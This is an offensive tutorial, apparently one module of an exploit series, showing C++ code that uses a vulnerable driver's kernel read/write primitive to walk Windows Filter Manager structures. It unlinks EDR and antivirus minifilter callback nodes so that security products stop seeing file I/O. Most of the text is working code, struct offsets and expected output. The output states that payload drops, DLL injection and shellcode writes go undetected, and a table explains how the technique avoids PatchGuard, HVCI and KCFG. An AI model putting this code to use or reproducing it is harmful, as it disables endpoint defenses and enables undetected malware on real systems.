# 12 — Minifilter Callback Blind (FLT_VOLUME OperationLists Unlinking)

**File:** `12_minifilter_blind.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Kernel VA read/write (LIST_ENTRY manipulation)  
**Output:** Minifilter drivers (EDR/AV) no longer receive notifications about file I/O operations  
**Based on:** MiniFilter Callback Unlinking (S12/0x12Dark, April 2026)

---

## Objective

Walk the internal data structure tree of Filter Manager (`fltmgr.sys`) and unlink `CALLBACK_NODE` entries from the `OperationLists` of each `FLT_VOLUME`. After unlinking, EDR/AV minifilters no longer receive file I/O events (create, read, write, directory query, etc.) → payload drops, DLL injection via file write, and memory-mapped shellcode go undetected.

---

## Background Theory

### Filter Manager Architecture

Windows Filter Manager manages minifilter drivers in a tree structure:

```
FltGlobals                    ← global state of fltmgr.sys
  │
  └─ FrameList (LIST_ENTRY)
       │
       ├─ _FLTP_FRAME [0]     ← a "frame" = an instance of the filter manager
       │    │
       │    └─ VolumeList (LIST_ENTRY)
       │         │
       │         ├─ _FLT_VOLUME [C:]   ← an attached volume
       │         │    │
       │         │    └─ Callbacks (_CALLBACK_CTRL)
       │         │         │
       │         │         └─ OperationLists[0..49]  ← one list per IRP_MJ_*
       │         │              │
       │         │              ├─ CALLBACK_NODE (EDR callback)
       │         │              └─ CALLBACK_NODE (AV callback)
       │         │
       │         └─ _FLT_VOLUME [D:]
       │              └─ ...
       │
       └─ _FLTP_FRAME [1] (if present)
```

### CALLBACK_NODE layout

```
struct CALLBACK_NODE {
    +0x000  CallbackLinks   LIST_ENTRY   ← linked into OperationLists[irp]
    +0x010  Flags           ULONG
    +0x018  Instance        PFLT_INSTANCE
    +0x020  PreOperation    PFLT_PRE_OPERATION_CALLBACK   ← THIS IS WHAT WE UNLINK
    +0x028  PostOperation   PFLT_POST_OPERATION_CALLBACK
};
```

### Why UNLINK instead of zeroing the function pointer?

The older technique (zeroing fn ptr) is blocked by **KCFG (Kernel Control Flow Guard)** on certain builds: the kernel validates the fn ptr before calling → null fn ptr → crash.

S12's April 2026 technique: **unlink the node from the LIST_ENTRY chain** instead of patching the fn ptr. The kernel never sees this node again → no crash → KCFG is irrelevant.

### Struct offsets (stable Win10 19041 → Win11 26100)

```cpp
#define FLTGLOBALS_FrameList_OFFSET    0x0A0   // FltGlobals+0x0A0 = FrameList LIST_ENTRY
#define FLTP_FRAME_VolumeList_OFFSET   0x0A8   // frame_va+0x0A8 = VolumeList LIST_ENTRY
#define FLT_VOLUME_FrameLink_OFFSET    0x010   // vol+0x010 = LIST_ENTRY within VolumeList
#define FLT_VOLUME_Callbacks_OFFSET    0x198   // vol+0x198 = _CALLBACK_CTRL start
#define CALLBACK_CTRL_OpLists_OFFSET   0x000   // OperationLists starts at +0 of _CALLBACK_CTRL
#define CALLBACK_NODE_Links_OFFSET     0x000   // CallbackLinks (LIST_ENTRY) at start of node
#define CALLBACK_NODE_Pre_OFFSET       0x020   // PreOperation fn ptr
#define CALLBACK_NODE_Post_OFFSET      0x028   // PostOperation fn ptr
#define NUM_IRP_MAJOR                  50      // IRP_MJ_MAXIMUM_FUNCTION+1
```

---

## Code Walkthrough

### GetFltGlobals() — resolve FltGlobals kernel VA

```cpp
static uint64_t GetFltGlobals(uint64_t cr3, uint64_t fltmgr_base)
{
    // FltGlobals is a data symbol exported from fltmgr.sys
    // Cannot use GetNtExport because we need to parse fltmgr exports (not ntoskrnl)
    // Solution: load fltmgr.sys into user space as a "no-link DLL"
    HMODULE hFlt = LoadLibraryExA("fltmgr.sys", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    // DONT_RESOLVE_DLL_REFERENCES: maps the file into memory but does not run DllMain
    // and does not resolve imports → safe, fast
    
    void *ptr = GetProcAddress(hFlt, "FltGlobals");
    // GetProcAddress searches the export table → returns user-space VA
    
    uint64_t rva = (uint64_t)ptr - (uint64_t)hFlt;
    // RVA = user VA - user load base = offset within the file
    // This RVA is THE SAME in the kernel because the PE loader maps identical sections
    
    FreeLibrary(hFlt);
    uint64_t va = fltmgr_base + rva;
    // Kernel VA = kernel fltmgr base + RVA
    return va;
}
```

This trick works because the Windows PE loader (both user-mode and kernel-mode) maps a module with the same section offsets. RVAs are always consistent between the user-mode and kernel-mode copies of the same DLL.

### Read fltmgr.sys image size

```cpp
uint8_t fltbuf[0x1000] = {};
KernelRead(cr3, fltmgr_base, fltbuf, sizeof(fltbuf));  // read PE header
auto *dos = (IMAGE_DOS_HEADER*)fltbuf;
auto *nt  = (IMAGE_NT_HEADERS64*)(fltbuf + dos->e_lfanew);
uint64_t fltmgr_size = nt->OptionalHeader.SizeOfImage;
```

`SizeOfImage` is needed for filtering: skip callback nodes whose fn ptr falls in the range `[fltmgr_base, fltmgr_base+size)` — these are fltmgr-internal nodes, not EDR callbacks.

### UnlinkedNode struct — state for restoration

```cpp
struct UnlinkedNode {
    uint64_t node_va;    // VA of the CALLBACK_NODE that was unlinked
    uint64_t prev_va;    // VA of the previous LIST_ENTRY (prev node's Flink field)
    uint64_t next_va;    // VA of the next LIST_ENTRY (next node's Blink-1's Flink field)
    uint64_t prev_flink; // = next_va (what we wrote into prev->Flink)
    uint64_t next_blink; // = prev_va (what we wrote into next->Blink)
};
static UnlinkedNode g_unlinked[MAX_UNLINKED];  // MAX_UNLINKED = 512
```

### UnlinkNode() — standard LIST_ENTRY unlink

```cpp
static void UnlinkNode(uint64_t cr3, uint64_t node_va,
                        uint64_t prev_le_va, uint64_t next_le_va)
{
    // Standard doubly-linked list unlink:
    // prev->Flink = next
    KernelWriteU64(cr3, prev_le_va, next_le_va);
    // next->Blink = prev
    // Blink is at Flink+8, so next->Blink = next_le_va + 8
    KernelWriteU64(cr3, next_le_va + 8, prev_le_va);
    
    // Point the unlinked node back to itself (clean, empty-list state)
    KernelWriteU64(cr3, node_va,     node_va);   // node->Flink = node
    KernelWriteU64(cr3, node_va + 8, node_va);   // node->Blink = node
    
    // Save for later restore
    if (g_unlinked_count < MAX_UNLINKED) {
        UnlinkedNode &u = g_unlinked[g_unlinked_count++];
        u.node_va    = node_va;
        u.prev_va    = prev_le_va;
        u.next_va    = next_le_va;
        u.prev_flink = next_le_va;
        u.next_blink = prev_le_va;
    }
}
```

4 writes: 2 to link prev↔next, 2 to self-loop the node (avoids stale pointers back into the modified list).

### ProcessVolume() — walk callback nodes for one volume

```cpp
static int ProcessVolume(uint64_t cr3, uint64_t vol_va,
                          uint64_t fltmgr_base, uint64_t fltmgr_size,
                          bool do_unlink, int vol_idx)
{
    uint64_t cb_ctrl_va = vol_va + FLT_VOLUME_Callbacks_OFFSET;
    // cb_ctrl_va = address of the _CALLBACK_CTRL struct (+0x198 from vol start)
    
    for (int irp = 0; irp < NUM_IRP_MAJOR; irp++) {
        // Each OperationList is a LIST_ENTRY (16 bytes = Flink + Blink)
        uint64_t list_head_va = cb_ctrl_va + CALLBACK_CTRL_OpLists_OFFSET + (uint64_t)irp * 16;
        // irp=0 → list_head_va = cb_ctrl_va + 0x000 (IRP_MJ_CREATE callbacks)
        // irp=1 → list_head_va = cb_ctrl_va + 0x010
        // irp=3 → list_head_va = cb_ctrl_va + 0x030 (IRP_MJ_READ callbacks)
        
        uint64_t head_flink = 0;
        if (!KernelReadU64(cr3, list_head_va, &head_flink)) continue;
        if (head_flink == list_head_va) continue;  // empty list, skip
```

### Walk nodes within one OperationList

```cpp
        uint64_t cur = head_flink;
        uint64_t prev_le_va = list_head_va;  // prev = list head initially
        
        while (cur != list_head_va && node_count < 128) {
            // cur = VA of CALLBACK_NODE.CallbackLinks (LIST_ENTRY = first field)
            // Since CallbackLinks is the first field, cur also = VA of the full CALLBACK_NODE
            
            uint64_t pre_fn = 0, post_fn = 0;
            KernelReadU64(cr3, cur + CALLBACK_NODE_Pre_OFFSET,  &pre_fn);   // +0x020
            KernelReadU64(cr3, cur + CALLBACK_NODE_Post_OFFSET, &post_fn);  // +0x028
            
            uint64_t next = 0;
            if (!KernelReadU64(cr3, cur, &next)) break;
            // Read the Flink of the current node (= VA of the next node)
```

### Classification: fltmgr-internal vs EDR callback

```cpp
            // Callback within fltmgr.sys range → framework node, skip
            bool pre_in_flt  = (pre_fn  >= fltmgr_base && pre_fn  < fltmgr_base + fltmgr_size);
            bool post_in_flt = (post_fn >= fltmgr_base && post_fn < fltmgr_base + fltmgr_size);
            bool is_kernel_ptr = (pre_fn >> 48) == 0xFFFF || (post_fn >> 48) == 0xFFFF;
            // is_kernel_ptr: avoid processing garbage data

            printf("    vol[%d] irp=%02d %-18s  node=0x%016llX  pre=0x%016llX%s  post=0x%016llX%s\n",
                   vol_idx, irp, IrpName(irp), cur,
                   pre_fn,  pre_in_flt  ? "[flt]" : "",
                   post_fn, post_in_flt ? "[flt]" : "");

            if (do_unlink && !pre_in_flt && !post_in_flt && is_kernel_ptr) {
                // Unlink non-fltmgr EDR node
                UnlinkNode(cr3, cur, prev_le_va, next);
                // After unlinking, prev_le_va does not change (cur has been removed from the chain)
                cur = next;
                node_count++;
                continue;
                // Do not update prev_le_va because cur has been unlinked
            }
            
            prev_le_va = cur;  // advance prev (only when not unlinking)
            cur = next;
```

`prev_le_va` logic: when unlinking a node, we do not advance `prev_le_va` because `prev` is still the node before the unlinked one — it has already been rewritten to point to `next`.

### Walk frames and volumes

```cpp
// FrameList head at FltGlobals+0x0A0
uint64_t frame_list_head_va = flt_globals_va + FLTGLOBALS_FrameList_OFFSET;
uint64_t frame_flink = 0;
KernelReadU64(cr3, frame_list_head_va, &frame_flink);

uint64_t frame_cur = frame_flink;
while (frame_cur != frame_list_head_va && frame_count < 16) {
    uint64_t frame_va = frame_cur;
    // FrameList is a LIST_ENTRY at offset 0x000 of _FLTP_FRAME
    // → frame_cur IS the _FLTP_FRAME VA (first field)

    // VolumeList at frame+0x0A8
    uint64_t vol_list_head_va = frame_va + FLTP_FRAME_VolumeList_OFFSET;
    uint64_t vol_flink = 0;
    KernelReadU64(cr3, vol_list_head_va, &vol_flink);

    uint64_t vol_cur = vol_flink;
    while (vol_cur != vol_list_head_va && vc < 64) {
        // vol_cur = VA of _FLT_VOLUME.FrameLink.Flink
        // FrameLink is at +0x010, so _FLT_VOLUME base = vol_cur - 0x010
        uint64_t vol_va = vol_cur - FLT_VOLUME_FrameLink_OFFSET;
        
        ProcessVolume(cr3, vol_va, fltmgr_base, fltmgr_size, do_unlink, vol_idx);
        
        uint64_t vol_next = 0;
        KernelReadU64(cr3, vol_cur, &vol_next);  // advance via Flink
        vol_cur = vol_next;
    }
    
    uint64_t frame_next = 0;
    KernelReadU64(cr3, frame_cur, &frame_next);  // advance frame
    frame_cur = frame_next;
}
```

Important: `vol_cur - FLT_VOLUME_FrameLink_OFFSET` because VolumeList holds the Flink of the `FrameLink` field, not the Flink of the whole struct. The offset must be subtracted to get the base address of `_FLT_VOLUME`.

### RestoreAll() — reverse-order relinking

```cpp
static void RestoreAll(uint64_t cr3)
{
    // Restore in reverse order to handle nested dependencies
    for (int i = g_unlinked_count - 1; i >= 0; i--) {
        UnlinkedNode &u = g_unlinked[i];
        
        // Relink: prev->Flink = node, next->Blink = node
        KernelWriteU64(cr3, u.prev_va,        u.node_va);   // prev->Flink = node
        KernelWriteU64(cr3, u.next_va + 8,    u.node_va);   // next->Blink = node
        
        // Restore node's own pointers
        KernelWriteU64(cr3, u.node_va,        u.next_va);   // node->Flink = next
        KernelWriteU64(cr3, u.node_va + 8,    u.prev_va);   // node->Blink = prev
    }
    printf("[+] Restored %d unlinked callback nodes\n", g_unlinked_count);
}
```

Reverse order: if multiple nodes were unlinked from the same list, restoring in reverse order ensures the chain is relinked correctly.

### IrpName() — IRP major function names

```cpp
static const char *IrpName(int i)
{
    static const char *names[] = {
        "CREATE","CREATE_NAMED_PIPE","CLOSE","READ","WRITE","QUERY_INFO",
        "SET_INFO","QUERY_EA","SET_EA","FLUSH","QUERY_VOL_INFO","SET_VOL_INFO",
        "DIR_CTRL","FS_CTRL","DEV_CTRL","INTERNAL_IOCTL","SHUTDOWN",
        "LOCK","CLEANUP","CREATE_MAILSLOT","QUERY_SECURITY","SET_SECURITY",
        "POWER","SYS_CTRL","DEV_CHANGE","QUERY_QUOTA","SET_QUOTA","PNP",
        // 28-49 are ?28..?49 (no standard names for minifilter)
        ...
    };
    return names[i];
}
```

IRP major functions 0-27 have names; 28-49 are less commonly used.

---

## Expected Output

```
[+] fltmgr.sys base=0xFFFFF8000AB00000  size=0x91000
[+] FltGlobals VA = 0xFFFFF8000AB65A00  (RVA=0x65A00)

[Frame 0] @ 0xFFFF88001234A000
    [Vol 0] @ 0xFFFF88009ABCD000  (Callbacks @ +0x198)
    vol[0] irp=00 CREATE             node=0xFFFF880012345000  pre=0xFFFF8001EDCB0000  post=0xFFFF8001EDCB1000
    vol[0] irp=00 CREATE             node=0xFFFF880012346000  pre=0xFFFF8000AB123456[flt]  post=0x0000000000000000
    vol[0] irp=03 READ               node=0xFFFF880012347000  pre=0xFFFF8001EDCB2000  post=0x0000000000000000
    ...

[*] Press Enter to UNLINK EDR callback nodes from all volumes...

[+] 15 callback nodes unlinked across all volumes
[+] Minifilter drivers can no longer intercept file I/O:
    - file drops go undetected
    - DLL injection via file write goes undetected
    - memory-mapped payload writes go undetected
```

---

## Stability

| Issue | Explanation |
|-------|-------------|
| PatchGuard | **Not checked** — fltmgr internal data structures |
| HVCI | Not affected — LIST_ENTRY manipulation is data, not code |
| KCFG | **Not relevant** — we do not patch fn ptrs, we unlink nodes |
| Offset changes | Offsets stable Win8–Win11 26100; future builds may differ |
| Re-attach | Some EDRs have a watchdog thread that detects and re-attaches the minifilter |
| fltmgr crash | Only non-fltmgr nodes are unlinked → framework internal nodes remain intact |

---

## Flow Summary

```
GetSystemCR3() → cr3
GetModuleBase("fltmgr.sys") → fltmgr_base
KernelRead(fltmgr PE header) → fltmgr_size

GetFltGlobals():
    LoadLibraryEx(fltmgr.sys, DONT_RESOLVE) → hFlt
    GetProcAddress(hFlt, "FltGlobals") → user_va
    RVA = user_va - hFlt
    FltGlobals_kernel_va = fltmgr_base + RVA

Phase 1 (dry run):
    Walk FltGlobals+0x0A0 → frames → volumes → OperationLists → nodes
    Print each non-fltmgr callback node

[User confirms]

Phase 2 (unlink):
    Same walk, do_unlink=true
    For each non-fltmgr node in each IRP list:
        prev->Flink = next
        next->Blink = prev
        node->Flink = node (self-loop)
        node->Blink = node

[+] N nodes unlinked — EDR blind to file I/O

[Press Enter]

RestoreAll() (reverse order):
    For each saved node (i = count-1 down to 0):
        prev->Flink = node
        next->Blink = node
        node->Flink = next
        node->Blink = prev
```
